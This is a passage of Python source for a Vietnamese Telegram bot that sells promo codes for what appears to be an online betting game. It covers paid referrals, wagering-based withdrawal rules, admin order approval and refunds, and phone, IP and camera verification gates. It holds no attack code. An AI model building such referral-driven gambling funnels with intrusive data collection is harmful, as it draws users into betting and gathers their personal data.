        f"{E['SHIELD']} <b>📌 QUY ĐỊNH SỬ DỤNG & ĐIỀU KIỆN RÚT TIỀN</b>\n\n"
        f"1️⃣ {E['TARGET']} <b>Điều kiện cược:</b> Hoàn thành đủ 1 vòng cược theo giá trị code để đáp ứng điều kiện rút tiền.\n\n"
        f"2️⃣ {E['BANK']} <b>Tài khoản chưa có lịch sử nạp trên 50K:</b> Cần nạp tối thiểu 50.000đ và hoàn thành mức cược 50.000đ (X1 vòng cược) trước khi thực hiện rút tiền.\n\n"
        f"3️⃣ {E['CHECK2']} <b>Tài khoản đã có lịch sử nạp trên 50K:</b> Được rút tiền từ code sau khi hoàn thành các điều kiện cược theo quy định.\n\n"
        f"{E['NUM_4']} {E['EXCL']} <b>Giới hạn nhập code:</b> Không cộng dồn code và chỉ được nhập tối đa 5 code từ bot mỗi ngày.\n\n"
        f"{E['NUM_5']} {E['ROCKET']} <b>Code từ sự kiện khác:</b> Không thuộc giới hạn 5 code/ngày của bot; việc sử dụng vẫn tuân theo thể lệ riêng của từng sự kiện.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['WARN']} <b>LƯU Ý QUAN TRỌNG</b> {E['WARN']}\n"
        f"{E['INFO']} Vui lòng đọc kỹ các điều kiện trước khi sử dụng code để nắm rõ quy định và đảm bảo quyền lợi của mình.\n\n"
        f"{E['HEART']} Chúc anh em trải nghiệm vui vẻ và may mắn! {E['CLOVER']}{E['FIRE']}"
    )


async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    user = update.effective_user
    if not message or not user:
        return
    if update.effective_chat.type != "private":
        return

    if user.id in pending_captcha_users:
        user_input = (message.text or "").strip()
        if await handle_captcha_input(update, context, user.id, user_input):
            return

    db_user = await ensure_user_exists(update)
    user_withdraw_state.pop(user.id, None)
    if await is_maintenance() and user.id not in ADMIN_IDS:
        await message.reply_text(
            f"{E['BANDAGE']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n"
            f"Vui lòng quay lại sau!",
            parse_mode="HTML",
        )
        return
    if not db_user or db_user[3] == 1:
        ip_val = (
            db_user[7]
            if (db_user and len(db_user) > 7 and db_user[7])
            else "Không xác định"
        )
        await message.reply_text(
            f"{E['GLOBE']} <b>PHÁT HIỆN TRÙNG IP!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Địa chỉ IP <code>{ip_val}</code> đã được tài khoản khác sử dụng.\n"
            f"Tài khoản của bạn đã bị <b>khóa vĩnh viễn</b> do trùng IP và full thông tin!",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove(),
        )
        return

    if await get_verify_setting("verify_phone"):
        if not await check_phone_verified(user.id) and user.id not in ADMIN_IDS:
            await prompt_phone_verification(message, user.id)
            return

    if await get_verify_setting("verify_cccam"):
        if not await check_cccam_verified(user.id) and user.id not in ADMIN_IDS:
            await prompt_miniapp_captcha_verification(message, user.id)
            return

    if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting(
        "verify_camera"
    ):
        if (
            not await check_miniapp_captcha_verified(user.id)
            or not await check_camera_verified(user.id)
        ) and user.id not in ADMIN_IDS:
            await prompt_miniapp_captcha_verification(message, user.id)
            return

    if await get_verify_setting("verify_ip"):
        if not await check_ip_verified(user.id) and user.id not in ADMIN_IDS:
            await prompt_ip_verification(message, user.id)
            return

    if await get_verify_setting("verify_captcha"):
        if not await check_captcha_verified(user.id) and user.id not in ADMIN_IDS:
            if user.id not in pending_captcha_users:
                await send_captcha_challenge(message, context, user.id)
                return

    if await get_verify_setting("verify_channel"):
        if user.id not in ADMIN_IDS:
            missing_channels = await get_missing_channels(context.bot, user.id)
            if missing_channels:
                buttons = build_channel_buttons(missing_channels)
                missing_text = "\n".join([
                    f"• <b>{ch}</b>" for ch in missing_channels
                ])
                await message.reply_text(
                    f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"{E['WARN']} Bạn còn thiếu <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
                    f"{missing_text}\n\n"
                    f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút bên dưới để tiếp tục!",
                    reply_markup=InlineKeyboardMarkup(buttons),
                    parse_mode="HTML",
                )
                return

    text = (message.text or "").strip()

    if user.id in ADMIN_IDS and is_admin_kb_text(text):
        if await admin_keyboard_handler(update, context, text):
            return

    if text in ["Menu", "⚙️ Menu"]:
        if user.id not in ADMIN_IDS:
            return
        await show_admin_page(message, user.id, 0)
        return

    if text in ["Tài Khoản", "👤 Tài Khoản"]:
        balance = db_user[1]
        phone_str = (
            db_user[6] if len(db_user) > 6 and db_user[6] else "Chưa xác minh"
        )
        invited_count = await get_valid_referrals_count(user.id)
        res_withdraw = await db_query(
            "SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE user_id=%s and type LIKE 'Mua Code%%' AND status='Thành công'",
            (user.id,),
            fetchone=True,
        )
        total_withdraw = res_withdraw[0]
        msg = (
            f"{E['LOVE_FACE']} <b>THÔNG TIN TÀI KHOẢN VIP</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['RIGHT']} <b>ID:</b> <code>{user.id}</code>\n"
            f"{E['PHONE']} <b>SĐT:</b> <code>{phone_str}</code>\n"
            f"{E['MONEY']} <b>Số dư:</b> <code>{balance:,}đ</code>\n"
            f"{E['ROCKET']} <b>Đã mời thành công:</b> <code>{invited_count}</code> người\n"
            f"{E['CARD']} <b>Đã dùng mua Code:</b> <code>{total_withdraw:,}đ</code>"
        )
        await message.reply_text(msg, parse_mode="HTML")

    elif text in ["Mời Bạn Bè", "🎁 Mời Bạn Bè"]:
        try:
            bot_info = await context.bot.get_me()
            bot_username = bot_info.username
        except Exception as exc:
            logger.exception("Không lấy được username bot: %s", exc)
            await message.reply_text(
                f"{E['CROSS']} Không lấy được thông tin bot. Vui lòng thử lại.",
                parse_mode="HTML",
            )
            return
        if not bot_username:
            await message.reply_text(
                f"{E['CROSS']} Bot chưa có username, không thể tạo link mời.",
                parse_mode="HTML",
            )
            return
        ref_link = f"https://t.me/{bot_username}?start={user.id}"
        msg = (
            f"{E['LOVE_FACE']} <b>CHƯƠNG TRÌNH MỜI BẠN BÈ</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['RIGHT']} <b>Link giới thiệu của bạn:</b>\n"
            f"<code>{ref_link}</code>\n\n"
            f"{E['INFO']} <b>Thể lệ nhận thưởng:</b>\n"
            f"• {E['MONEY_FLY']} Nhận ngay: <b>+{REFERRAL_REWARD:,}đ</b> / lượt mời thành công.\n"
            f"• {E['RIGHT']} Bạn bè phải hoàn tất các bước xác minh theo yêu cầu hệ thống.\n"
            f"• {E['TOP']} Giá mua Code: <b>{CODE_PRICE:,}đ</b>"
        )
        await message.reply_text(msg, parse_mode="HTML")

    elif text in ["Top", "🔝 Top"]:
        top_users = await db_query(
            """
            SELECT t.user_id, u.username, COUNT(t.id) AS ref_count
            FROM transactions t
            JOIN users u ON u.user_id = t.user_id
            WHERE t.type = 'Thưởng Mời Bạn' AND t.status = 'Thành công' AND u.is_banned = 0
            GROUP BY t.user_id, u.username
            ORDER BY ref_count DESC
            LIMIT 10
            """,
            fetchall=True,
        )
        if not top_users:
            await message.reply_text(
                f"{E['BANDAGE']} <b>Hiện chưa có ai trong bảng xếp hạng Top tuyển ref!</b>",
                parse_mode="HTML",
            )
            return
        msg = f"{E['TOP']} <b>TOP 10 THÀNH VIÊN TUYỂN REF NHIỀU NHẤT</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        medals = {
            1: E["GOLD_MEDAL"],
            2: E["SILVER_MEDAL"],
            3: E["BRONZE_MEDAL"],
        }
        for idx, (top_id, top_username, ref_count) in enumerate(
            top_users, start=1
        ):
            name_str = f"@{top_username}" if top_username else f"User {top_id}"
            icon = medals.get(idx, E["RIGHT"])
            msg += f"{icon} <b>Top {idx}:</b> {name_str} — <code>{ref_count:,}</code> bạn bè\n"
        await message.reply_text(msg, parse_mode="HTML")

    elif text in ["Nhóm Hỗ Trợ", "💬 Nhóm Hỗ Trợ"]:
        await message.reply_text(
            f"{E['PHONE']} <b>NHÓM HỖ TRỢ CHÍNH THỨC:</b>\n{E['RIGHT']} {SUPPORT_GROUP}\n\n"
            f"{E['DEV']} <b>ADMIN:</b> @dgfrutil",
            parse_mode="HTML",
        )

    elif text in ["Link Game", "🎮 Link Game"]:
        await message.reply_text(
            f"{E['GAME_BELL']} <b>LINK GAME</b> {E['GAME_STAR']}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['GAME_STARSTRUCK']} Bấm <b>Nhập Code Tại Đây</b> để nhập code vừa mua.\n"
            f"{E['GAME_CAR']} Bấm <b>Link room tại đây</b> để vào phòng chơi game.\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['GAME_STORM']} Chúc anh em chơi vui vẻ và may mắn! {E['GAME_TONGUE']}",
            reply_markup=get_game_link_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

    elif text in ["Lịch Sử", "Lịch Sử Giao Dịch", "📜 Lịch Sử Giao Dịch"]:
        txs = await db_query(
            "SELECT type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 10",
            (user.id,),
            fetchall=True,
        )
        if not txs:
            await message.reply_text(
                f"{E['BANDAGE']} <b>Bạn chưa có giao dịch nào.</b>",
                parse_mode="HTML",
            )
            return
        msg = f"{E['INBOX']} <b>LỊCH SỬ GIAO DỊCH GẦN ĐÂY</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        for tx_type, amount, status, created_at, details in txs:
            icon = (
                E["LIKE"] if status == "Thành công"
                else (E["HOURGLASS"] if status == "Chờ duyệt" else E["CROSS"])
            )
            msg += (
                f"{icon} <b>{tx_type}</b>: <code>{amount:,}đ</code>\n"
                f"{E['SHIELD']} Chi tiết: <code>{details or 'Không có'}</code>\n"
                f"{E['HOURGLASS']} Thời gian: <code>{created_at}</code>\n"
                "----------------------------------\n"
            )
        await message.reply_text(msg, parse_mode="HTML")

    elif text in ["Rút Code", "💳 Rút Code", "Rút Tiền", "💳 Rút Tiền"]:
        if (
            not await get_verify_setting("allow_withdraw")
            and user.id not in ADMIN_IDS
        ):
            await message.reply_text(
                f"{E['CROSS']} <b>Tính năng rút tiền hiện đang TẮT bởi Quản trị viên!</b>",
                parse_mode="HTML",
            )
            return
        if db_user[4] == 1:
            await message.reply_text(
                f"{E['CROSS']} <b>Tài khoản của bạn đã bị CẤM RÚT CODE!</b>",
                parse_mode="HTML",
            )
            return
        buttons = [[InlineKeyboardButton(
            f"XÁC NHẬN MUA CODE (Giá {CODE_PRICE:,}đ)",
            callback_data=f"buycode_confirm_{CODE_PRICE}",
            api_kwargs={"icon_custom_emoji_id": "6206196801775605920"},
        )]]
        await message.reply_text(
            f"{E['SHIELD']} <b>HỆ THỐNG RÚT CODE TỰ ĐỘNG</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['MONEY']} <b>Số dư hiện tại:</b> <code>{db_user[1]:,}đ</code>\n\n"
            f"{E['LOVE_FACE']} Nhấn nút bên dưới để xác nhận mua code giá <b>{CODE_PRICE:,}đ</b>:",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="HTML",
        )


async def edit_admin_msg(query, extra_html: str, keep_markup=None):
    msg = query.message
    try:
        if msg.text:
            await query.edit_message_text(
                f"{msg.text_html}\n\n{extra_html}",
                parse_mode="HTML",
                reply_markup=keep_markup,
            )
        else:
            await query.edit_message_caption(
                caption=f"{msg.caption_html or ''}\n\n{extra_html}",
                parse_mode="HTML",
                reply_markup=keep_markup,
            )
    except Exception as exc:
        logger.warning("Không sửa được tin nhắn admin: %s", exc)


async def code_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    user = query.from_user
    data = query.data or ""

    is_admin_action = data.startswith(
        ("approve_code_", "reject_code_", "approve_order_", "reject_order_")
    )
    if is_admin_action and user.id not in ADMIN_IDS:
        await query.answer(
            "Bạn không có quyền thực hiện thao tác này!", show_alert=True
        )
        return
    try:
        await query.answer()
    except Exception:
        pass

    # ===== Đơn mua code MỚI: tiền đã bị trừ ngay khi gửi đơn =====
    if data.startswith(("approve_order_", "reject_order_")):
        is_approve = data.startswith("approve_order_")
        try:
            order_id = int(data.split("_")[-1])
        except ValueError:
            return
        orig_markup = query.message.reply_markup if query.message else None
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass

        if is_approve:

            def process_order_approve(cursor):
                cursor.execute(
                    "SELECT user_id, amount, status FROM transactions "
                    "WHERE id=%s AND type='Đơn Mua Code' FOR UPDATE",
                    (order_id,),
                )
                row = cursor.fetchone()
                if not row:
                    return ("NO_ORDER", None, None)
                buyer_id, amount, status = row
                if status != "Chờ duyệt":
                    return ("ALREADY", buyer_id, None)
                cursor.execute(
                    "SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE"
                )
                stock_item = cursor.fetchone()
                if not stock_item:
                    return ("OUT_OF_STOCK", buyer_id, None)
                stock_id, code_val = stock_item
                cursor.execute(
                    "UPDATE code_stock SET is_used=1 WHERE id=%s", (stock_id,)
                )
                cursor.execute(
                    "UPDATE transactions SET type=%s, status=%s, details=%s WHERE id=%s",
                    (f"Mua Code {amount}đ", "Thành công", f"Code: {code_val}", order_id),
                )
                return ("OK", buyer_id, code_val)

            try:
                status, buyer_id, code_val = await db_transaction(process_order_approve)
            except Exception as exc:
                logger.exception("Lỗi duyệt đơn mua code: %s", exc)
                await edit_admin_msg(
                    query,
                    f"{E['CROSS']} <b>Lỗi hệ thống khi duyệt đơn.</b>",
                    keep_markup=orig_markup,
                )
                return
            if status == "NO_ORDER":
                await edit_admin_msg(query, f"{E['CROSS']} <b>Không tìm thấy đơn này.</b>")
                return
            if status == "ALREADY":
                await edit_admin_msg(query, f"{E['INFO']} <b>Đơn này đã được xử lý trước đó.</b>")
                return
            if status == "OUT_OF_STOCK":
                await edit_admin_msg(
                    query,
                    f"{E['CROSS']} <b>Kho code đã hết!</b> Tiền của khách vẫn đang được giữ. "
                    f"Thêm code rồi bấm Duyệt lại, hoặc bấm Từ chối để hoàn tiền.",
                    keep_markup=orig_markup,
                )
                return
            try:
                await context.bot.send_message(
                    chat_id=buyer_id,
                    text=build_buy_success_text(code_val),
                    parse_mode="HTML",
                )
            except Exception as exc:
                logger.warning("Không gửi code cho user %s: %s", buyer_id, exc)
            await edit_admin_msg(
                query, f"{E['CHECK']} <b>ĐÃ ĐƯỢC ADMIN DUYỆT THÀNH CÔNG!</b>"
            )
            return

        def process_order_reject(cursor):
            cursor.execute(
                "SELECT user_id, amount, status FROM transactions "
                "WHERE id=%s AND type='Đơn Mua Code' FOR UPDATE",
                (order_id,),
            )
            row = cursor.fetchone()
            if not row:
                return ("NO_ORDER", None, 0)
            buyer_id, amount, status = row
            if status != "Chờ duyệt":
                return ("ALREADY", buyer_id, amount)
            cursor.execute(
                "UPDATE users SET balance = balance + %s WHERE user_id=%s",
                (amount, buyer_id),
            )
            cursor.execute(
                "UPDATE transactions SET status=%s, details=%s WHERE id=%s",
                ("Đã hoàn tiền", "Admin từ chối - đã hoàn tiền", order_id),
            )
            return ("OK", buyer_id, amount)

        try:
            status, buyer_id, amount = await db_transaction(process_order_reject)
        except Exception as exc:
            logger.exception("Lỗi từ chối đơn mua code: %s", exc)
            await edit_admin_msg(
                query,
                f"{E['CROSS']} <b>Lỗi hệ thống khi từ chối đơn.</b>",
                keep_markup=orig_markup,
            )
            return
        if status == "NO_ORDER":
            await edit_admin_msg(query, f"{E['CROSS']} <b>Không tìm thấy đơn này.</b>")
            return
        if status == "ALREADY":
            await edit_admin_msg(query, f"{E['INFO']} <b>Đơn này đã được xử lý trước đó.</b>")
            return
        try:
            await context.bot.send_message(
                chat_id=buyer_id,
                text=(
                    f"{E['CROSS']} <b>Đơn mua code của bạn đã bị Admin từ chối!</b>\n"
                    f"{E['MONEY']} Đã hoàn lại <b>{amount:,}đ</b> vào số dư của bạn."
                ),
                parse_mode="HTML",
            )
        except Exception:
            pass
        await edit_admin_msg(
            query,
            f"{E['CROSS']} <b>ĐÃ BỊ TỪ CHỐI BỞI ADMIN!</b> (đã hoàn {amount:,}đ cho khách)",
        )
        return

    if data.startswith("approve_code_"):
        try:
            target_user_id = int(data.replace("approve_code_", ""))
        except ValueError:
            return

        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass

        def process_admin_approve(cursor):
            cursor.execute(
                "SELECT balance FROM users WHERE user_id=%s FOR UPDATE",
                (target_user_id,),
            )
            u_row = cursor.fetchone()
            if not u_row or u_row[0] < CODE_PRICE:
                return "NOT_ENOUGH_BALANCE"
            cursor.execute(
                "SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE"
            )
            stock_item = cursor.fetchone()
            if not stock_item:
                return "OUT_OF_STOCK"
            code_stock_id, code_val = stock_item
            cursor.execute(
                "UPDATE users SET balance = balance - %s WHERE user_id=%s",
                (CODE_PRICE, target_user_id),
            )
            cursor.execute(
                "UPDATE code_stock SET is_used=1 WHERE id=%s", (code_stock_id,)
            )
            cursor.execute(
                "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
                (
                    target_user_id,
                    f"Mua Code {CODE_PRICE}đ",
                    CODE_PRICE,
                    "Thành công",
                    get_now_str(),
                    f"Code: {code_val}",
                ),
            )
            return code_val

        try:
            res = await db_transaction(process_admin_approve)
        except Exception as exc:
            logger.exception("Lỗi duyệt code: %s", exc)
            await edit_admin_msg(
                query, f"{E['CROSS']} <b>Lỗi hệ thống khi duyệt đơn.</b>"
            )
            return

        if res == "NOT_ENOUGH_BALANCE":
            await edit_admin_msg(
                query,
                f"{E['CROSS']} <b>Không duyệt được: người dùng không đủ số dư.</b>",
            )
            return
        if res == "OUT_OF_STOCK":
            await edit_admin_msg(
                query, f"{E['CROSS']} <b>Kho code đã hết!</b>"
            )
            return

        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=build_buy_success_text(res),
                parse_mode="HTML",
            )
        except Exception as exc:
            logger.warning("Không gửi code cho user %s: %s", target_user_id, exc)

        await edit_admin_msg(
            query, f"{E['CHECK']} <b>ĐÃ ĐƯỢC ADMIN DUYỆT THÀNH CÔNG!</b>"
        )
        return

    if data.startswith("reject_code_"):
        try:
            target_user_id = int(data.replace("reject_code_", ""))
        except ValueError:
            return
        try:
            await query.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"{E['CROSS']} <b>Đơn mua code của bạn đã bị Admin từ chối!</b>",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await edit_admin_msg(
            query, f"{E['CROSS']} <b>ĐÃ BỊ TỪ CHỐI BỞI ADMIN!</b>"
        )
        return

    if (
        not await get_verify_setting("allow_withdraw")
        and user.id not in ADMIN_IDS
    ):
        await query.edit_message_text(
            f"{E['CROSS']} <b>Tính năng rút tiền đang bị khóa bởi Hệ thống!</b>",
            parse_mode="HTML",
        )
        return
    db_user = await db_query(
        "SELECT balance, is_banned, is_withdraw_banned FROM users WHERE user_id=%s",
        (user.id,),
        fetchone=True,
    )
    if not db_user or db_user[1] == 1:
        await query.edit_message_text(
            f"{E['CROSS']} <b>Tài khoản của bạn đã bị khóa vĩnh viễn!</b>",
            parse_mode="HTML",
        )
        return
    if db_user[2] == 1:
        await query.edit_message_text(
            f"{E['CROSS']} <b>Tài khoản của bạn đã bị cấm rút code!</b>",
            parse_mode="HTML",
        )
        return
    balance = db_user[0]

    if data.startswith("buycode_confirm"):
        shown = data.replace("buycode_confirm", "").lstrip("_")
        if shown.isdigit() and int(shown) != CODE_PRICE:
            await query.edit_message_text(
                f"{E['WARN']} <b>GIÁ CODE ĐÃ THAY ĐỔI!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Giá hiện tại: <b>{CODE_PRICE:,}đ</b>\n"
                f"Vui lòng bấm lại nút <b>Rút Code</b> để xem giá mới.",
                parse_mode="HTML",
            )
            return

        if balance < CODE_PRICE:
            await query.edit_message_text(
                f"{E['CROSS']} <b>SỐ DƯ KHÔNG ĐỦ!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Bạn cần tối thiểu <b>{CODE_PRICE:,}đ</b> để mua code. Số dư hiện tại: <b>{balance:,}đ</b>",
                parse_mode="HTML",
            )
            return

        is_auto = await get_verify_setting("auto_buy_code")
        if not is_auto:
            # TRỪ TIỀN NGAY khi gửi đơn về admin duyệt
            def create_pending_order(cursor):
                cursor.execute(
                    "UPDATE users SET balance = balance - %s WHERE user_id=%s AND balance >= %s",
                    (CODE_PRICE, user.id, CODE_PRICE),
                )
                if cursor.rowcount != 1:
                    return None
                cursor.execute(
                    "INSERT INTO transactions (user_id, type, amount, status, created_at, details) "
                    "VALUES (%s, %s, %s, %s, %s, %s) RETURNING id",
                    (
                        user.id,
                        "Đơn Mua Code",
                        CODE_PRICE,
                        "Chờ duyệt",
                        get_now_str(),
                        "Đã trừ tiền, chờ Admin duyệt",
                    ),
                )
                return cursor.fetchone()[0]

            try:
                order_id = await db_transaction(create_pending_order)
            except Exception as exc:
                logger.exception("Lỗi tạo đơn mua code: %s", exc)
                await query.edit_message_text(
                    f"{E['CROSS']} Đã xảy ra lỗi khi gửi đơn, vui lòng thử lại.",
                    parse_mode="HTML",
                )
                return
            if order_id is None:
                await query.edit_message_text(
                    f"{E['CROSS']} <b>Số dư không đủ!</b>", parse_mode="HTML"
                )
                return

            admin_markup = InlineKeyboardMarkup([[
                abtn("Duyệt", "MEDAL", callback_data=f"approve_order_{order_id}"),
                abtn("Từ chối", "CROSS", callback_data=f"reject_order_{order_id}"),
            ]])
            sent_ok = 0
            for admin_id in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        chat_id=admin_id,
                        text=(
                            f"{E['WARN']} <b>CÓ ĐƠN MUA CODE MỚI CHỜ DUYỆT!</b>\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"{E['CARD']} <b>Mã đơn:</b> <code>#{order_id}</code>\n"
                            f"{E['TARGET']} <b>User ID:</b> <code>{user.id}</code>\n"
                            f"{E['RIGHT']} <b>Username:</b> @{user.username or 'Không có'}\n"
                            f"{E['MONEY']} <b>Số tiền:</b> <code>{CODE_PRICE:,}đ</code> (đã trừ khỏi số dư khách)"
                        ),
                        reply_markup=admin_markup,
                        parse_mode="HTML",
                    )
                    sent_ok += 1
                except Exception as exc:
                    logger.warning(
                        "Không gửi được đơn cho admin %s: %s", admin_id, exc
                    )

            if sent_ok == 0:
                # Không báo được cho admin nào -> hoàn tiền ngay, tránh khách mất tiền oan
                def refund_unsent(cursor):
                    cursor.execute(
                        "UPDATE transactions SET status=%s, details=%s WHERE id=%s AND status='Chờ duyệt'",
                        ("Đã hoàn tiền", "Không gửi được đơn tới Admin - đã hoàn tiền", order_id),
                    )
                    if cursor.rowcount == 1:
                        cursor.execute(
                            "UPDATE users SET balance = balance + %s WHERE user_id=%s",
                            (CODE_PRICE, user.id),
                        )

                await db_transaction(refund_unsent)
                await query.edit_message_text(
                    f"{E['CROSS']} Không gửi được đơn tới Admin, tiền đã được hoàn lại. Vui lòng thử lại sau.",
                    parse_mode="HTML",
                )
                return

            await query.edit_message_text(
                f"{E['HOURGLASS']} <b>Đơn mua code của bạn đã được gửi đến Admin!</b>\n"
                f"{E['MONEY']} Đã trừ <b>{CODE_PRICE:,}đ</b> khỏi số dư (mã đơn <code>#{order_id}</code>).\n"
                f"Vui lòng chờ Admin duyệt. Nếu bị từ chối, tiền sẽ được hoàn lại tự động.",
                parse_mode="HTML",
            )
            return

        def process_buy_code(cursor):
            cursor.execute(
                "SELECT id, code_val FROM code_stock WHERE is_used=0 ORDER BY id ASC LIMIT 1 FOR UPDATE"
            )
            stock_item = cursor.fetchone()
            if not stock_item:
                return "OUT_OF_STOCK"
            code_stock_id, code_val = stock_item
            cursor.execute(
                "UPDATE users SET balance = balance - %s WHERE user_id=%s AND balance >= %s",
                (CODE_PRICE, user.id, CODE_PRICE),
            )
            if cursor.rowcount != 1:
                return "NOT_ENOUGH_BALANCE"
            cursor.execute(
                "UPDATE code_stock SET is_used=1 WHERE id=%s", (code_stock_id,)
            )
            cursor.execute(
                "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
                (
                    user.id,
                    f"Mua Code {CODE_PRICE}đ",
                    CODE_PRICE,
                    "Thành công",
                    get_now_str(),
                    f"Code: {code_val}",
                ),
            )
            return code_val

        try:
            result = await db_transaction(process_buy_code)
        except Exception as exc:
            logger.exception("Lỗi khi mua code: %s", exc)
            await query.edit_message_text(
                f"{E['CROSS']} Đã xảy ra lỗi trong quá trình xử lý mua code.",
                parse_mode="HTML",
            )
            return
        if result == "OUT_OF_STOCK":
            await query.edit_message_text(
                f"{E['BANDAGE']} <b>RẤT TIẾC, KHO CODE HIỆN ĐÃ HẾT!</b>\nVui lòng liên hệ Admin hoặc quay lại sau.",
                parse_mode="HTML",
            )
        elif result == "NOT_ENOUGH_BALANCE":
            await query.edit_message_text(
                f"{E['CROSS']} <b>Số dư không đủ!</b>", parse_mode="HTML"
            )
        else:
            await query.edit_message_text(
                build_buy_success_text(result), parse_mode="HTML"
            )


async def build_admin_menu():
    st_phone = await get_verify_setting("verify_phone")
    st_cccam = await get_verify_setting("verify_cccam")
    st_miniapp_cap = await get_verify_setting("verify_miniapp_captcha")
    st_ip = await get_verify_setting("verify_ip")
    st_channel = await get_verify_setting("verify_channel")
    st_captcha = await get_verify_setting("verify_captcha")
    st_withdraw = await get_verify_setting("allow_withdraw")
    st_auto_buy = await get_verify_setting("auto_buy_code")
    st_camera = await get_verify_setting("verify_camera")

    def state(v):
        return "BẬT" if v else "TẮT"

    buttons = [
        [abtn(
            f"Xác minh SĐT: {state(st_phone)}",
            "PHONE",
            callback_data="toggle_verify_phone",
        )],
        [abtn(
            f"Xác minh CCCAM (Camera từ đầu): {state(st_cccam)}",
            "IMAGE",
            callback_data="toggle_verify_cccam",
        )],
        [abtn(
            f"Captcha & Camera MiniApp: {state(st_miniapp_cap or st_camera)}",
            "SHIELD",
            callback_data="toggle_verify_miniapp_captcha",
        )],
        [abtn(
            f"Xác minh IP Mini App: {state(st_ip)}",
            "PC",
            callback_data="toggle_verify_ip",
        )],
        [abtn(
            f"Check Kênh/Nhóm: {state(st_channel)}",
            "PIN2",
            callback_data="toggle_verify_channel",
        )],
        [abtn(
            f"Check CAPTCHA: {state(st_captcha)}",
            "DICE",
            callback_data="toggle_verify_captcha",
        )],
        [abtn(
            f"Tính năng Rút Tiền: {state(st_withdraw)}",
            "CARD",
            callback_data="toggle_allow_withdraw",
        )],
        [abtn(
            f"Tự động Mua Code: {state(st_auto_buy)}",
            "BATTERY",
            callback_data="toggle_auto_buy_code",
        )],
        [abtn(
            "Xác Minh Toàn Bộ Thành Viên",
            "REFRESH",
            callback_data="admin_verify_all",
        )],
    ]
    text = (
        f"{E['GEAR']} <b>BẢNG ĐIỀU KHIỂN QUẢN TRỊ VIÊN</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>Nhấn vào từng nút bấm bên dưới để Bật/Tắt cấu hình xác minh & tính năng tương ứng.\n"
        f"Khi BẬT \"Xác minh CCCAM\", toàn bộ thành viên sẽ phải làm lại captcha + camera.</i>"
    )
    return text, InlineKeyboardMarkup(buttons)


async def admin_menu_command(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    if not is_admin(update):
        return
    text, reply_markup = await build_admin_menu()
    await update.message.reply_text(
        text, reply_markup=reply_markup, parse_mode="HTML"
    )


async def admin_toggle_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    query = update.callback_query
    if not query:
        return
    if not is_admin(update):
        try:
            await query.answer(
                "Bạn không có quyền thực hiện thao tác này!", show_alert=True
            )
        except Exception:
            pass
        return
    data = query.data or ""

    if data == "admin_verify_all":
        await db_query(
            "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
            commit=True,
        )
        await reset_all_ip_logs()
        pending_miniapp_captcha.clear()
        pending_camera_verified.clear()
        try:
            await query.answer(
                "Đã đặt lại xác minh toàn bộ thành công!", show_alert=True
            )
        except Exception:
            pass
        await query.message.reply_text(
            f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI TRẠNG THÁI XÁC MINH TOÀN BỘ THÀNH VIÊN!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Tất cả người dùng sẽ phải xác minh lại từ đầu khi tương tác với Bot.",
            parse_mode="HTML",
        )
        return

    if data == "toggle_verify_miniapp_captcha":
        cur_cap = await get_verify_setting("verify_miniapp_captcha")
        cur_cam = await get_verify_setting("verify_camera")
        new_val = not (cur_cap or cur_cam)
        await set_verify_setting("verify_miniapp_captcha", new_val)
        await set_verify_setting("verify_camera", new_val)
        status_text = "🟢 BẬT" if new_val else "🔴 TẮT"
        try:
            await query.answer(
                f"Captcha & Camera MiniApp: {status_text}"
            )
        except Exception:
            pass
        text, reply_markup = await build_admin_menu()
        try:
            await query.edit_message_text(
                text, reply_markup=reply_markup, parse_mode="HTML"
            )
        except Exception:
            pass
        return

    key_map = {
        "toggle_verify_phone": "verify_phone",
        "toggle_verify_cccam": "verify_cccam",
